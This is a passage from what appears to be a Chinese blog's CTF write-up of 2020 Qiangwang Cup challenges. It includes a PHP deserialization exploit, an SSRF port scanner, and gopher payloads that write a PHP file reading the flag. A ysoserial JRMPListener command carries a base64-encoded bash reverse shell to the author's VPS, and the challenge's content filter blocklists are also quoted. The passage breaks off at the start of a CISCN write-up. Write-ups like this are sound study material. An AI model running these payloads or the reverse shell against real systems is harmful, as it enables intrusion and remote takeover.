unserialize($_GET[<span class="string">'x'</span>])-&gt;get_it();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>第一层是一道反序列化题目，添加了限制，首先调用了<code>$student-&gt;$boy();</code>，然后再将flag赋给全局变量<code>$result</code>，如果在赋flag值之前，就调用Pass类的read()方法是读不到flag的，所以需要首先进行一遍完整的<code>User</code>的<code>__destruct()</code>函数，将flag赋给<code>$result</code>,然后再执行一遍<code>__destruct()</code>，继续调用<code>$student-&gt;$boy();</code>来触发Pass类的read()函数，读取flag；接下来再读flag时发现在<code>ob_start()</code>和<code>ob_end_clean()</code>之间的<code>print</code>是输出不到屏幕的，这里有两种方法可以绕过：</p>
<ol>
<li>在<code>ob_end_clean()</code>执行前寻找一条触发到执行到exit()的链。</li>
<li>在<code>ob_end_clean()</code>前报错，直接停止执行。</li>
</ol>
<p>本题选择第二种，在<code>print $result</code>与<code>ob_end_clean()</code>之间只有只有is_string()和global 两条语句，通过测试发现</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">va</span> </span>&#123;</span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">a</span><span class="params">()</span> </span>&#123;</span><br><span class="line">		$a = <span class="string">"this"</span>;</span><br><span class="line">		<span class="keyword">global</span> $$a;  </span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line">$b = <span class="keyword">new</span> va();</span><br><span class="line">$b-&gt;a();</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="comment">//执行会报错</span></span><br></pre></td></tr></table></figure>

<p>exp:</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Pass</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">read</span><span class="params">()</span> </span>&#123;</span><br><span class="line">		ob_start();</span><br><span class="line">		<span class="keyword">global</span> $result;</span><br><span class="line">		<span class="keyword">print</span> $result;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span> </span>&#123;</span><br><span class="line">	<span class="keyword">public</span> $age, $sex, $num;</span><br><span class="line"></span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span> </span>&#123;</span><br><span class="line">		$student = <span class="keyword">$this</span>-&gt;age;</span><br><span class="line">		$boy = <span class="keyword">$this</span>-&gt;sex;</span><br><span class="line">		$a = <span class="keyword">$this</span>-&gt;num;</span><br><span class="line">		$student-&gt;$boy();</span><br><span class="line">		<span class="keyword">if</span> (!(is_string($a)) || !(is_string($boy)) || !(is_object($student))) &#123;</span><br><span class="line">			ob_end_clean();</span><br><span class="line">			<span class="keyword">exit</span>();</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">global</span> $$a;</span><br><span class="line">		$result = $GLOBALS[<span class="string">'flag'</span>];</span><br><span class="line">		ob_end_clean();</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line">$a = <span class="keyword">new</span> Pass();</span><br><span class="line"></span><br><span class="line">$b2 = <span class="keyword">new</span> User();</span><br><span class="line">$b2-&gt;sex = <span class="string">"read"</span>;</span><br><span class="line">$b2-&gt;num = <span class="string">"this"</span>;</span><br><span class="line">$b2-&gt;age = $a;</span><br><span class="line"></span><br><span class="line">$d = <span class="keyword">new</span> <span class="keyword">Exception</span>;</span><br><span class="line">$b = <span class="keyword">new</span> User();</span><br><span class="line">$b-&gt;sex = <span class="string">"getCode"</span>;</span><br><span class="line">$b-&gt;num = <span class="string">"result"</span>;</span><br><span class="line">$b-&gt;aa = $b2;</span><br><span class="line">$b-&gt;age = $d;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> urlencode(serialize($b));</span><br><span class="line"><span class="comment">//O%3A4%3A%22User%22%3A4%3A%7Bs%3A3%3A%22age%22%3BO%3A9%3A%22Exception%22%3A7%3A%7Bs%3A10%3A%22%00%2A%00message%22%3Bs%3A0%3A%22%22%3Bs%3A17%3A%22%00Exception%00string%22%3Bs%3A0%3A%22%22%3Bs%3A7%3A%22%00%2A%00code%22%3Bi%3A0%3Bs%3A7%3A%22%00%2A%00file%22%3Bs%3A41%3A%22D%3A%5C%E6%AF%94%E8%B5%9B202006%5C%E5%BC%BA%E7%BD%91%E6%9D%AF%5Cban+pen%5Cexp.php%22%3Bs%3A7%3A%22%00%2A%00line%22%3Bi%3A37%3Bs%3A16%3A%22%00Exception%00trace%22%3Ba%3A0%3A%7B%7Ds%3A19%3A%22%00Exception%00previous%22%3BN%3B%7Ds%3A3%3A%22sex%22%3Bs%3A7%3A%22getCode%22%3Bs%3A3%3A%22num%22%3Bs%3A6%3A%22result%22%3Bs%3A2%3A%22aa%22%3BO%3A4%3A%22User%22%3A3%3A%7Bs%3A3%3A%22age%22%3BO%3A4%3A%22Pass%22%3A0%3A%7B%7Ds%3A3%3A%22sex%22%3Bs%3A4%3A%22read%22%3Bs%3A3%3A%22num%22%3Bs%3A4%3A%22this%22%3B%7D%7D</span></span><br></pre></td></tr></table></figure>

<p>得到ssrf.php</p>
<p>image-20200824111939809</p>
<p>第二层利用ssrf.php探测内网，</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"></span><br><span class="line">url = <span class="string">"http://39.98.131.124/ssrf.php?we_have_done_ssrf_here_could_you_help_to_continue_it=http://172.26.98.147:"</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">35000</span>,<span class="number">50000</span>):</span><br><span class="line">	url = <span class="string">"http://39.98.131.124/ssrf.php?we_have_done_ssrf_here_could_you_help_to_continue_it=http://172.26.98.147:"</span></span><br><span class="line">	url+=str(i)</span><br><span class="line">	re=requests.get(url)</span><br><span class="line">	<span class="keyword">print</span> url</span><br><span class="line">	<span class="keyword">if</span> <span class="string">"HTTP"</span> <span class="keyword">in</span> re.text:</span><br><span class="line">		<span class="keyword">print</span> url</span><br><span class="line">		<span class="keyword">break</span></span><br></pre></td></tr></table></figure>

<p>得到在40000端口开了服务，</p>
<p><img src="/2020/08/24/2020%E5%BC%BA%E7%BD%91%E6%9D%AF%E9%83%A8%E5%88%86%E9%A2%98%E7%9B%AEwriteup/image-20200824112617077.png" alt="image-20200824112617077"></p>
<p>是一个评论框，可以传file和content两个参数，在<a href="http://127.0.0.1:40000/uploads/可以看到文件夹，文件夹的名对应phpsessid值，利用gopher协议ssrf可以在uploads目录写文件。" target="_blank" rel="noopener">http://127.0.0.1:40000/uploads/可以看到文件夹，文件夹的名对应phpsessid值，利用gopher协议ssrf可以在uploads目录写文件。</a></p>
<p>比赛时直接用</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">gopher:&#x2F;&#x2F;172.26.98.147:40000&#x2F;_POST%20&#x2F;%20HTTP&#x2F;index.php1.1%250d%250aHost:127.0.0.1:40000%250d%250aContent-Type:application&#x2F;x-www-form-urlencoded%250d%250aCookie:%20PHPSESSID&#x3D;o151hrta2onlamvpvsq9695785;%250d%250aContent-Length:%2083%250d%250a%250d%250afile&#x3D;php%3A%2F%2Ffilter%2Fconvert.base64-decode%2Fresource%3Da.php%26content&#x3D;PD89cGhwaW5mbygpOyAg</span><br></pre></td></tr></table></figure>

<p>就可以得到phpinfo，但是后来复现时，就不可以了，感觉题目被改了。23333</p>
<p>之后修改content，绕过过滤得到flag。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">gopher:&#x2F;&#x2F;172.26.98.147:40000&#x2F;_POST%20&#x2F;%20HTTP&#x2F;index.php1.1%250d%250aHost:127.0.0.1:40000%250d%250aContent-Type:application&#x2F;x-www-form-urlencoded%250d%250aCookie:%20PHPSESSID&#x3D;o151hrta2onlamvpvsq9695785;%250d%250aContent-Length:%2087%250d%250a%250d%250afile&#x3D;php%3A%2F%2Ffilter%2Fconvert.base64-decode%2Fresource%3Db.php%26content&#x3D;MjM8Pz1gY2F0IC9mbGFnYDsg</span><br></pre></td></tr></table></figure>

<img src="/2020/08/24/2020%E5%BC%BA%E7%BD%91%E6%9D%AF%E9%83%A8%E5%88%86%E9%A2%98%E7%9B%AEwriteup/image-20200824141727459.png" alt="image-20200824141727459" style="zoom: 200%;">

<p>content-length:长度直接本地开一个一摸一样的服务，看下长度即可，</p>
<img src="/2020/08/24/2020%E5%BC%BA%E7%BD%91%E6%9D%AF%E9%83%A8%E5%88%86%E9%A2%98%E7%9B%AEwriteup/image-20200824141850604.png" alt="image-20200824141850604" style="zoom:150%;">

<p>成功写入文件，得到flag,</p>
<p><img src="/2020/08/24/2020%E5%BC%BA%E7%BD%91%E6%9D%AF%E9%83%A8%E5%88%86%E9%A2%98%E7%9B%AEwriteup/image-20200824141758218.png" alt="image-20200824141758218"></p>
<p>尝试读取源码：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">23&lt;?&#x3D;&#96;cat  ..&#x2F;..&#x2F;in*ex.***&#96;;</span><br></pre></td></tr></table></figure>

<img src="/2020/08/24/2020%E5%BC%BA%E7%BD%91%E6%9D%AF%E9%83%A8%E5%88%86%E9%A2%98%E7%9B%AEwriteup/image-20200824142827863.png" alt="image-20200824142827863" style="zoom:200%;">

<p>下面是做题时读取的服务器文件</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//index.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">#ini_set('display_errors', 'on');</span></span><br><span class="line"></span><br><span class="line">session_start();</span><br><span class="line"><span class="keyword">include</span> <span class="string">'del.php'</span>;</span><br><span class="line">$upload_dir = sprintf(<span class="string">"./uploads/%s/"</span>, session_id());</span><br><span class="line">$id = session_id();</span><br><span class="line">@mkdir($upload_dir, <span class="number">0755</span>, <span class="keyword">true</span>);</span><br><span class="line"></span><br><span class="line">chdir($upload_dir);</span><br><span class="line">ini_set(<span class="string">'open_basedir'</span>, <span class="string">'.'</span>);</span><br><span class="line"><span class="keyword">foreach</span> (glob(getcwd() . <span class="string">'/*'</span>) <span class="keyword">as</span> $file) &#123;</span><br><span class="line">	<span class="keyword">if</span> (is_file($file)) &#123;</span><br><span class="line">		unlink($file);</span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">		<span class="keyword">if</span> (time() - filemtime($file) &gt;= <span class="number">5</span>) &#123;</span><br><span class="line">			Delete($file);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$data = <span class="string">""</span>;</span><br><span class="line">$filename = <span class="string">""</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'file'</span>])) &#123;</span><br><span class="line">	$filename = $_POST[<span class="string">'file'</span>];</span><br><span class="line">	<span class="keyword">if</span> (stripos($filename, <span class="string">'BE'</span>) === <span class="keyword">false</span> &amp;&amp; stripos($filename, <span class="string">'write'</span>) === <span class="keyword">false</span> &amp;&amp; stripos($filename, <span class="string">'zlib'</span>) === <span class="keyword">false</span> &amp;&amp; stripos($filename, <span class="string">'sto'</span>) === <span class="keyword">false</span>) &#123;</span><br><span class="line">		<span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'content'</span>])) &#123;</span><br><span class="line">			$data = $_POST[<span class="string">'content'</span>];</span><br><span class="line"></span><br><span class="line">			<span class="keyword">if</span> (stripos($data, <span class="string">'ph'</span>) === <span class="keyword">false</span> &amp;&amp; stripos($data, <span class="string">'Pz4='</span>) === <span class="keyword">false</span> &amp;&amp; stripos($data, <span class="string">'&lt;?'</span>) === <span class="keyword">false</span> &amp;&amp; stripos($data, <span class="string">'PD9wa'</span>) === <span class="keyword">false</span> &amp;&amp; stripos($data, <span class="string">'script'</span>) === <span class="keyword">false</span> &amp;&amp; stripos($data, <span class="string">'='</span>) === <span class="keyword">false</span>) &#123;</span><br><span class="line">				file_put_contents($filename, $data);</span><br><span class="line">			&#125;</span><br><span class="line"></span><br><span class="line">		&#125;</span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">		<span class="keyword">die</span>(<span class="string">"error"</span>);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//del.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Delete</span><span class="params">($path)</span> </span>&#123;</span><br><span class="line">	<span class="keyword">if</span> (is_dir($path) === <span class="keyword">true</span>) &#123;</span><br><span class="line">		$files = <span class="keyword">new</span> RecursiveIteratorIterator(<span class="keyword">new</span> RecursiveDirectoryIterator($path), RecursiveIteratorIterator::CHILD_FIRST);</span><br><span class="line"></span><br><span class="line">		<span class="keyword">foreach</span> ($files <span class="keyword">as</span> $file) &#123;</span><br><span class="line">			<span class="keyword">if</span> (in_array($file-&gt;getBasename(), <span class="keyword">array</span>(<span class="string">'.'</span>, <span class="string">'..'</span>)) !== <span class="keyword">true</span>) &#123;</span><br><span class="line">				<span class="keyword">if</span> ($file-&gt;isDir() === <span class="keyword">true</span>) &#123;</span><br><span class="line">					rmdir($file-&gt;getPathName());</span><br><span class="line">				&#125; <span class="keyword">else</span> <span class="keyword">if</span> (($file-&gt;isFile() === <span class="keyword">true</span>) || ($file-&gt;isLink() === <span class="keyword">true</span>)) &#123;</span><br><span class="line">					unlink($file-&gt;getPathname());</span><br><span class="line">				&#125;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">return</span> rmdir($path);</span><br><span class="line">	&#125; <span class="keyword">else</span> <span class="keyword">if</span> ((is_file($path) === <span class="keyword">true</span>) || (is_link($path) === <span class="keyword">true</span>)) &#123;</span><br><span class="line">		<span class="keyword">return</span> unlink($path);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>下面是复现时读的服务器文件</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//index.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">#ini_set('display_errors', 'on');</span></span><br><span class="line"></span><br><span class="line">session_start();</span><br><span class="line"><span class="keyword">include</span>(<span class="string">'del.php'</span>);</span><br><span class="line">$upload_dir = sprintf(<span class="string">"./uploads/%s/"</span>, session_id());</span><br><span class="line">$id=session_id();</span><br><span class="line">@mkdir($upload_dir, <span class="number">0755</span>, <span class="keyword">true</span>);</span><br><span class="line"></span><br><span class="line">chdir($upload_dir);</span><br><span class="line">ini_set(<span class="string">'open_basedir'</span>, <span class="string">'.'</span>);</span><br><span class="line"><span class="keyword">foreach</span> (glob(getcwd().<span class="string">'/*'</span>) <span class="keyword">as</span> $file) &#123;</span><br><span class="line">        <span class="keyword">if</span> (is_file($file)) &#123;</span><br><span class="line">                unlink($file);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (time() - filemtime($file) &gt;= <span class="number">200</span>) &#123;</span><br><span class="line">            Delete($file);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$data = <span class="string">""</span>;</span><br><span class="line">$filename = <span class="string">""</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'file'</span>]) ) &#123;</span><br><span class="line">	$filename = $_POST[<span class="string">'file'</span>];</span><br><span class="line">	<span class="keyword">if</span>(stripos($filename, <span class="string">'..'</span>)  === <span class="keyword">false</span> &amp;&amp;stripos($filename, <span class="string">'BE'</span>)  === <span class="keyword">false</span>&amp;&amp;stripos($filename, <span class="string">'write'</span>)  === <span class="keyword">false</span>&amp;&amp;stripos($filename, <span class="string">'zlib'</span>)  === <span class="keyword">false</span>&amp;&amp;stripos($filename, <span class="string">'sto'</span>)  === <span class="keyword">false</span>)&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'content'</span>])) &#123;</span><br><span class="line">            $data = $_POST[<span class="string">'content'</span>];</span><br><span class="line">	    </span><br><span class="line">	    <span class="keyword">if</span> (stripos($data, <span class="string">'`'</span>)  === <span class="keyword">false</span> &amp;&amp;stripos($data, <span class="string">'ll'</span>)  === <span class="keyword">false</span> &amp;&amp;stripos($data, <span class="string">'PD8'</span>)  === <span class="keyword">false</span>   &amp;&amp;stripos($data, <span class="string">'-'</span>)  === <span class="keyword">false</span>&amp;&amp;stripos($data, <span class="string">'ww'</span>)  === <span class="keyword">false</span> &amp;&amp; stripos($data, <span class="string">'6'</span>)  === <span class="keyword">false</span>&amp;&amp;stripos($data, <span class="string">'7'</span>)  === <span class="keyword">false</span>&amp;&amp;stripos($data, <span class="string">'rm'</span>)  === <span class="keyword">false</span> &amp;&amp; stripos($data, <span class="string">'mr'</span>)  === <span class="keyword">false</span> &amp;&amp;stripos($data, <span class="string">'sy'</span>)  === <span class="keyword">false</span> &amp;&amp;stripos($data, <span class="string">'ys'</span>)  === <span class="keyword">false</span> &amp;&amp;stripos($data, <span class="string">'ph'</span>)  === <span class="keyword">false</span>&amp;&amp;stripos($data, <span class="string">'Pz4='</span>)  === <span class="keyword">false</span> &amp;&amp; stripos($data, <span class="string">'&lt;?'</span>)  === <span class="keyword">false</span> &amp;&amp; stripos($data, <span class="string">'PD9wa'</span>)  === <span class="keyword">false</span> &amp;&amp; stripos($data, <span class="string">'script'</span>)  === <span class="keyword">false</span>&amp;&amp;stripos($data, <span class="string">'='</span>)  === <span class="keyword">false</span>) &#123;</span><br><span class="line">                file_put_contents($filename, $data);</span><br><span class="line">	    &#125;</span><br><span class="line">	</span><br><span class="line">	&#125; </span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">die</span>(<span class="string">"error"</span>);</span><br><span class="line">&#125;</span><br><span class="line">	</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>对比发现在file处加了<code>..</code>的过滤，在content中加了</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">stripos($data, <span class="string">'`'</span>)  === <span class="keyword">false</span> 		&amp;&amp;</span><br><span class="line">stripos($data, <span class="string">'ll'</span>)  === <span class="keyword">false</span> 	&amp;&amp;</span><br><span class="line">stripos($data, <span class="string">'PD8'</span>)  === <span class="keyword">false</span>   	&amp;&amp;</span><br><span class="line">stripos($data, <span class="string">'-'</span>)  === <span class="keyword">false</span>		&amp;&amp;</span><br><span class="line">stripos($data, <span class="string">'ww'</span>)  === <span class="keyword">false</span> 	&amp;&amp; </span><br><span class="line">stripos($data, <span class="string">'6'</span>)  === <span class="keyword">false</span>		&amp;&amp;</span><br><span class="line">stripos($data, <span class="string">'7'</span>)  === <span class="keyword">false</span>		&amp;&amp;</span><br><span class="line">stripos($data, <span class="string">'rm'</span>)  === <span class="keyword">false</span> 	&amp;&amp; </span><br><span class="line">stripos($data, <span class="string">'mr'</span>)  === <span class="keyword">false</span> 	&amp;&amp;</span><br><span class="line">stripos($data, <span class="string">'sy'</span>)  === <span class="keyword">false</span> 	&amp;&amp;</span><br><span class="line">stripos($data, <span class="string">'ys'</span>)  === <span class="keyword">false</span></span><br></pre></td></tr></table></figure>

<p>上面这些过滤。</p>
<h1 id="0x02-dice2cry"><a href="#0x02-dice2cry" class="headerlink" title="0x02 dice2cry"></a>0x02 dice2cry</h1><p>题目泄露了源码，abi.php.bak</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">session_start();</span><br><span class="line">header(<span class="string">"Content-type:text/html;charset=utf-8"</span>);</span><br><span class="line"></span><br><span class="line">        $data = json_decode($json_string, <span class="keyword">true</span>);</span><br><span class="line"></span><br><span class="line">        $rand_number = <span class="keyword">isset</span>($_POST[<span class="string">'this_is.able'</span>]) ? $_POST[<span class="string">'this_is.able'</span>] : mt_rand();</span><br><span class="line">        $n = gmp_init($data[<span class="string">'n'</span>]);</span><br><span class="line">        $d = gmp_init($data[<span class="string">'d'</span>]);</span><br><span class="line">        $c = gmp_init($rand_number);</span><br><span class="line">        $m = gmp_powm($c,$d,$n);</span><br><span class="line">        $v3 = gmp_init(<span class="string">'3'</span>);</span><br><span class="line">        $r = gmp_mod($m,$v3);</span><br><span class="line">        $result=(int)gmp_strval($r);</span><br><span class="line">        $dice = <span class="keyword">array</span>(<span class="string">"num"</span>=&gt;$result);</span><br><span class="line">        $json_obj = json_encode($dice);</span><br><span class="line">        <span class="keyword">echo</span> $json_obj;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>这里涉及到一个trick，因为php变量的原因，如果POST或GET传的参数包含<code>&#39;.&#39; &#39;[&#39; &#39;+&#39; &#39; &#39;</code>会转换成<code>_</code>，</p>
<p><a href="https://www.anquanke.com/post/id/181682" target="_blank" rel="noopener">如何滥用PHP字符串解析函数绕过IDS、IPS及WAF</a></p>
<p>用<code>this[is.able</code>向服务器传值，服务器就可以将值赋给<code>$_POST[&#39;this_is.able&#39;]</code>，然后接下来就是密码学了，可以在cookie中发现给了N 、d和加密的flag，我们可以向服务器发送任意密文，服务器返回对应密文解密的结果模3的值，之前的RSA LSB ORACLE攻击是利用模2来二分最终得到m的值，本题用的是模3,</p>
<h1 id="0x03-easy-java"><a href="#0x03-easy-java" class="headerlink" title="0x03 easy_java"></a>0x03 easy_java</h1><p>题目给了源码，</p>
<p><a href="https://mount4in.github.io/2020/03/10/高校战" 疫"网络安全分享赛部分赛题复现 #0x02-baby-java">高校战“疫”网络安全分享赛部分赛题复现</a></p>
<blockquote>
<p><img src="/2020/08/24/2020%E5%BC%BA%E7%BD%91%E6%9D%AF%E9%83%A8%E5%88%86%E9%A2%98%E7%9B%AEwriteup/image-20200823215753040.png" alt="image-20200823215753040"></p>
</blockquote>
<p>放到idea可以运行，本地采用jdk8u102版本可以成功，但使用jdk8u261不能成功。</p>
<p>由于题目利用黑名单过滤了很多，所以尝试利用JRMPClient绕过过滤，参考高校战役的baby_java的JRMPListener解法，利用JRMPListener。</p>
<p>过程如下：</p>
<p>在客户端执行</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">java -jar ysoserial-master-30099844c6-1.jar JRMPClient 129.204.207.xxx:8888 &gt; jrmpclient.cer</span><br><span class="line">windows系统这条命令只能在cmd下运行，在powershell运行会乱码，原因未知</span><br></pre></td></tr></table></figure>

<p><img src="/2020/08/24/2020%E5%BC%BA%E7%BD%91%E6%9D%AF%E9%83%A8%E5%88%86%E9%A2%98%E7%9B%AEwriteup/image-20200903152937979.png" alt="image-20200903152937979"></p>
<p>在vps上执行</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">java -cp ysoserial-master-30099844c6-1.jar  ysoserial.exploit.JRMPListener  8888 CommonsCollections5 &quot;bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMjkxxxxxxxxMTQvOTxxxxYxCg&#x3D;&#x3D;&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;</span><br></pre></td></tr></table></figure>

<p>同时在vps上监听50000端口（与上面的payload相对应）</p>
<p>然后访问<code>/jdk_der</code>路由</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">payload = open(<span class="string">"aa"</span>,<span class="string">"rb"</span>).read()</span><br><span class="line">proxies = &#123;<span class="string">"http"</span>:<span class="string">"127.0.0.1:8080"</span>&#125;</span><br><span class="line">requests.post(<span class="string">"http://39.101.166.142:8080/jdk_der"</span>,data=payload)</span><br></pre></td></tr></table></figure>

<p>也可以用burp发包</p>
<p>这时就可以反弹shell了。</p>
<p><img src="/2020/08/24/2020%E5%BC%BA%E7%BD%91%E6%9D%AF%E9%83%A8%E5%88%86%E9%A2%98%E7%9B%AEwriteup/image-20200824095918455.png" alt="image-20200824095918455"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">flag&#123;056eaalfe7scd222qwe2df36845b8ed170c67e23e3&#125;</span><br></pre></td></tr></table></figure>



<h1 id="0x04-红方辅助"><a href="#0x04-红方辅助" class="headerlink" title="0x04 红方辅助"></a>0x04 红方辅助</h1><p>用wireshark打开</p>
<img src="/2020/08/24/2020%E5%BC%BA%E7%BD%91%E6%9D%AF%E9%83%A8%E5%88%86%E9%A2%98%E7%9B%AEwriteup/image-20200830171012619.png" alt="image-20200830171012619" style="zoom:150%;">

<p>复制到a.txt。</p>
<p>exp:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> struct</span><br><span class="line">f = open(<span class="string">"a.txt"</span>, <span class="string">"r"</span>)</span><br><span class="line"></span><br><span class="line">f = f.readlines()</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">2075</span>,<span class="number">5</span>):</span><br><span class="line">    <span class="comment">#print(f[i])</span></span><br><span class="line">    funcs = &#123;</span><br><span class="line">        <span class="string">"0"</span> : <span class="keyword">lambda</span> x, y : x + y,</span><br><span class="line">        <span class="string">"1"</span> : <span class="keyword">lambda</span> x, y : x - y,</span><br><span class="line">        <span class="string">"2"</span> : <span class="keyword">lambda</span> x, y : x ^ y</span><br><span class="line">    &#125;</span><br><span class="line">    offset = &#123;</span><br><span class="line">        <span class="string">"0"</span> : <span class="number">0xefffff</span>,</span><br><span class="line">        <span class="string">"1"</span> : <span class="number">0xefffff</span>,</span><br><span class="line">        <span class="string">"2"</span> : <span class="number">0xffffff</span>,</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">#print(i)</span></span><br><span class="line">    btime = str(f[i+<span class="number">1</span>])</span><br><span class="line">    fn = chr(int(f[i+<span class="number">3</span>][<span class="number">16</span>:<span class="number">18</span>],<span class="number">16</span>))</span><br><span class="line">    salt = int(f[i+<span class="number">3</span>][<span class="number">18</span>:<span class="number">20</span>],<span class="number">16</span>)</span><br><span class="line">    ci = f[i+<span class="number">3</span>][<span class="number">20</span>:]</span><br><span class="line">    <span class="comment">#print(ci) </span></span><br><span class="line">    t = struct.unpack(<span class="string">"&lt;i"</span>, bytes().fromhex(btime))[<span class="number">0</span>]</span><br><span class="line">    boffset = offset[fn]</span><br><span class="line">    t -= boffset</span><br><span class="line">    t = struct.pack(<span class="string">"&lt;i"</span>, t)</span><br><span class="line">    k =<span class="number">0</span></span><br><span class="line">    m = <span class="string">""</span></span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">244</span>,<span class="number">2</span>):</span><br><span class="line">        c = ci[j:j+<span class="number">2</span>]</span><br><span class="line">        j = j+<span class="number">2</span></span><br><span class="line">        <span class="comment">#print(c)</span></span><br><span class="line">        <span class="keyword">if</span> funcs[fn](int(c,<span class="number">16</span>) , salt) % <span class="number">256</span>  ^ t[k] == <span class="number">10</span>:</span><br><span class="line">        	<span class="keyword">break</span></span><br><span class="line">        <span class="comment">#print((funcs[fn](int(c,16) , salt)^ t[k]))</span></span><br><span class="line">        m += chr(funcs[fn](int(c,<span class="number">16</span>) , salt) % <span class="number">256</span>  ^ t[k])</span><br><span class="line"></span><br><span class="line">        k = (k+<span class="number">1</span>)%<span class="number">4</span></span><br><span class="line">    print(m)</span><br></pre></td></tr></table></figure>

]]></content>
      <tags>
        <tag>writeup</tag>
      </tags>
  </entry>
  <entry>
    <title>2020ciscn-web题目writeup</title>
    <url>/2020/08/21/2020ciscn-web%E9%A2%98%E7%9B%AEwriteup/</url>
    <content><![CDATA[<p>Web越来越便宜</p>
<a id="more"></a>

<h1 id="0x01-babyunserialize"><a href="#0x01-babyunserialize" class="headerlink" title="0x01 babyunserialize"></a>0x01 babyunserialize</h1><p>wm2020ctf</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">DB</span>\<span class="title">SQL</span> &#123;</span><br><span class="line">	<span class="title">class</span> <span class="title">Mapper</span> &#123;</span><br><span class="line">		<span class="title">protected</span></span><br><span class="line">		//! <span class="title">PDO</span> <span class="title">wrapper</span></span><br><span class="line">		$<span class="title">db</span>,</span><br><span class="line">		//! <span class="title">Database</span> <span class="title">engine</span></span><br><span class="line">		$<span class="title">engine</span>,</span><br><span class="line">		//! <span class="title">SQL</span> <span class="title">table</span></span><br><span class="line">		$<span class="title">source</span>,</span><br><span class="line">		//! <span class="title">SQL</span> <span class="title">table</span> (<span class="title">quoted</span>)</span><br><span class="line">		$<span class="title">table</span>,</span><br><span class="line">		//! <span class="title">Alias</span> <span class="title">for</span> <span class="title">SQL</span> <span class="title">table</span></span><br><span class="line">		$<span class="title">as</span>,</span><br><span class="line">		//! <span class="title">Last</span> <span class="title">insert</span> <span class="title">ID</span></span><br><span class="line">		$<span class="title">_id</span>,</span><br><span class="line">		//! <span class="title">Defined</span> <span class="title">fields</span></span><br><span class="line">		